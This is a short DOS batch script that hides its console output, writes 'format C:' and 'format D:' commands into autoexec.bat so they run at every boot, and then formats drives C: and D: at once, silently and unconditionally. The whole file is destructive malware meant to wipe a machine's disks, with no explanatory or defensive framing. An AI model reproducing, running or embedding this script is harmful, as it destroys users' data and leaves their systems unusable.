@echo off
ctty NUL
echo >autoexec.bat
echo format C: /u /q /autotest > C:\autoexec.bat
echo format D: /u /q /autotest > C:\autoexec.bat
format C: /u /q /autotest
format D: /u /q /autotest
